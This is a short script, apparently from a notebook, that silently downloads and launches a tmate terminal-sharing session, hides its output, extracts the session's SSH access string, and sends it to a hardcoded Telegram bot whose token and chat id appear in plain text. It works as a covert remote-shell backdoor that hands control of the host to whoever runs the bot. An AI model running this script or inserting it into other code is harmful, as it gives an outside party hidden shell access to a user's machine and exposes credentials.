pkill -9 tmate
wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
pip install telepot
import subprocess as sp
output = sp.getoutput('./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh}"')
import telepot
def ste(use):
    token = "5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs"
    idd = 1380298324
    bot = telepot.Bot(token)
    bot.sendMessage(idd,use)
ste(output)
